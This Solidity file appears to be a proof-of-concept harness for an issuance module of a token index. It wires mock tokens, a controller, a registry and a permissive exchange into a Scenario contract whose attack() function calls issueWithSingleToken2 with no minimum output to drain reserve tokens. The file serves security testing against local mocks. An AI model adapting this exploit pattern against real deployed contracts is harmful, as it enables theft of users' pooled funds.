pragma solidity 0.6.10;
pragma experimental ABIEncoderV2;
import "./IssuanceModuleV2.sol";

interface IERC20Mini { function transfer(address,uint256) external returns(bool); function transferFrom(address,address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }
interface IModuleIssue { function issueWithSingleToken2(address,address,uint256,uint256,address[] calldata,uint256[] calldata,address,bool) external; }
interface ICKMini { function getComponents() external view returns(address[] memory); function getDefaultPositionRealUnit(address) external view returns(int256); function isInitializedModule(address) external view returns(bool); function mint(address,uint256) external; function invoke(address,uint256,bytes calldata) external returns(bytes memory); }

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals=18; uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s) public {name=n;symbol=s;}
    function mint(address to,uint256 a) external {balanceOf[to]+=a;totalSupply+=a;}
    function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"bal");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a,"bal");require(allowance[f][msg.sender]>=a,"allow");if(allowance[f][msg.sender]!=uint(-1)) allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}
contract MockController {
    address public registry; address public module; address public ck;
    constructor(address r) public {registry=r;}
    function resourceId(uint256) external view returns(address){return registry;}
    function isCK(address a) external view returns(bool){return a==ck;}
    function isModule(address a) external view returns(bool){return a==module;}
    function setCK(address a) external {ck=a;}
    function setModule(address a) external {module=a;}
    function feeRecipient() external view returns(address){return address(this);}
    function getModuleFee(address,uint256) external pure returns(uint256){return 0;}
}
contract MockRegistry {
    address public adapter;
    constructor(address a) public {adapter=a;}
    function getIntegrationAdapterWithHash(address,bytes32) external view returns(address){return adapter;}
    function isValidIntegration(address,string calldata) external pure returns(bool){return true;}
}
contract MockExchange {
    address public immutable reserve;
    constructor(address r) public {reserve=r;}
    function getSpender() external view returns(address){return address(this);}
    function generateDataParam(address[] memory,bool) external pure returns(bytes memory){return "";}
    function getMinAmountsOut(uint256 amountIn,address[] memory) external pure returns(uint256[] memory a){a=new uint256[](2);a[0]=amountIn;a[1]=amountIn;}
    function getMaxAmountsIn(uint256 amountOut,address[] memory) external pure returns(uint256[] memory a){a=new uint256[](2);a[0]=amountOut;a[1]=amountOut;}
    function getTradeCalldata(address,address,address to,uint256 fromQuantity,uint256,bytes memory) external view returns(address,uint256,bytes memory){return(address(this),0,abi.encodeWithSignature("trade(address,uint256)",to,fromQuantity));}
    function trade(address ck,uint256 amount) external {
        // The module lets the adapter choose calldata and supplies no minimum output.
        // This pool returns one reserve token per input token.
        IERC20Mini(msg.sender == address(this) ? address(0) : reserve).transferFrom(ck,address(this),0);
        IERC20Mini(reserve).transfer(ck,amount);
    }
}
contract MockCKToken {
    string public name="Cook Index"; string public symbol="CK"; uint8 public decimals=18; uint256 public totalSupply;
    address[] internal components; mapping(address=>uint256) public balanceOf; mapping(address=>uint256) public units; mapping(address=>mapping(address=>uint256)) public allowance;
    address public module; address public controller;
    constructor(address c,address a,address b,uint256 u) public {controller=c;components.push(a);components.push(b);units[a]=u;units[b]=u;}
    function getComponents() external view returns(address[] memory){return components;}
    function getDefaultPositionRealUnit(address c) external view returns(int256){return int256(units[c]);}
    function isInitializedModule(address m) external view returns(bool){return m==module;}
    function setModule(address m) external {module=m;}
    function mint(address to,uint256 a) external {require(msg.sender==module);balanceOf[to]+=a;totalSupply+=a;}
    function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a);balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
    function invoke(address target,uint256 value,bytes calldata data) external returns(bytes memory){require(msg.sender==module);(bool ok,bytes memory ret)=target.call.value(value)(data);require(ok,"invoke");return ret;}
    function invokeApprove(address token,address spender,uint256 amount) external {require(msg.sender==module);IERC20Mini(token).approve(spender,amount);}
}
contract Scenario {
    MockERC20 public issueToken; MockERC20 public reserveToken; MockCKToken public ckToken; MockExchange public exchange; MockController public controller; MockRegistry public registry; IModuleIssue public module;
    uint256 public constant SEED=1000 ether;
    constructor() public {
        issueToken=new MockERC20("Issue","ISS"); reserveToken=new MockERC20("Reserve","RSV"); exchange=new MockExchange(address(reserveToken)); registry=new MockRegistry(address(exchange)); controller=new MockController(address(registry));
        ckToken=new MockCKToken(address(controller),address(issueToken),address(reserveToken),1 ether); controller.setCK(address(ckToken));
        module=IModuleIssue(address(new IssuanceModuleV2(IController(address(controller)), IWETH(address(0))))); controller.setModule(address(module)); ckToken.setModule(address(module));
        issueToken.mint(address(this),SEED); issueToken.mint(address(ckToken),SEED); reserveToken.mint(address(exchange),SEED);
        issueToken.approve(address(module),uint(-1));
    }
    function attack(address receiver) external {
        address[] memory mids=new address[](2); uint256[] memory weights=new uint256[](2); weights[0]=1000 ether; weights[1]=1000 ether;
        module.issueWithSingleToken2(address(ckToken),address(issueToken),1 ether,0,mids,weights,receiver,true);
    }
    function reserveBalance() external view returns(uint256){return reserveToken.balanceOf(address(exchange));}
    function attackerBalance(address a) external view returns(uint256){return ckToken.balanceOf(a);}
    function asset() external view returns(address){return address(reserveToken);}
}
